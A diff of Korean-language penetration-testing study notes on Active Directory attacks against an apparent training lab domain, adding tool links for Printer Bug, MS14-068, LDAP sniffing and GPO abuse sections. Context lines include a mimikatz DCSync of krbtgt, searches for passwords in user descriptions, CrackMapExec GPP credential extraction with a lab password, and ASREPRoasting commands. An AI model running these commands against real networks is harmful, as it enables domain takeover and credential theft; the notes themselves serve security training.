@@ -782,6 +782,8 @@ mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
 
 <br/><br/>
 ## 2. Printer Bug
+- 도구1 : http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment
+- 도구2 : https://github.com/NotMedic/NetNTLMtoSilverTicket
 
 ### MS-PRN Printer Bug 열거
 ```
@@ -790,7 +792,16 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```
 
 <br/><br/>
-## 3. DNS 레코드 열거
+## 3. MS14-068
+- 도구 : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+
+<br/><br/>
+## 4. LDAP 자격 증명 스니핑
+- 참고 : https://grimhacker.com/2018/03/09/just-a-printer/
+
+<br/><br/>
+## 5. DNS 레코드 열거
+- 참고 : https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/
 
 ### adidnsdump 사용
 ```adidnsdump -u inlanefreight\\forend ldap://172.16.5.5```
@@ -802,7 +813,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```head records.csv```
 
 <br/><br/>
-## 4. 기타
+## 6. 기타
 
 ### Get-Domain User를 사용하여 Description 필드에서 비밀번호 찾기
 ```Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}```
@@ -814,7 +825,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts```
 
 <br/><br/>
-## 5. Group Policy Preferences (GPP) Passwords
+## 7. Group Policy Preferences (GPP) Passwords
 
 ###  SYSVOL 공유에 Groups.xml 보기
 
@@ -825,10 +836,12 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```crackmapexec smb -L | grep gpp```
 
 ### CrackMapExec의 gpp_autologin 모듈 사용
+- 참고 : https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin
+- 참고 도구 : https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
 ```crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin```
 
 <br/><br/>
-## 6. ASREPRoasting
+## 8. ASREPRoasting
 
 ### Get-DomainUser를 사용하여 DONT_REQ_PREAUTH 값 열거
 ```Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl```
@@ -846,7 +859,10 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users```
 
 <br/><br/>
-## 7. Group Policy Object (GPO) Abuse
+## 9. Group Policy Object (GPO) Abuse
+- 도구1 : https://github.com/Group3r/Group3r
+- 도구2 : https://github.com/sense-of-security/ADRecon
+- 도구3 : https://www.pingcastle.com/
 
 ### PowerView를 사용하여 GPO 이름 열거
 ```Get-DomainGPO |select displayname```
@@ -861,7 +877,8 @@ Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
 ```
 
 ### GPO GUID를 이름으로 변환
-```Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532```
+```Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532```<br/>
+- 참고 : https://github.com/FSecureLABS/SharpGPOAbuse
 
 <br/><br/>
 # Domain Trusts Primer
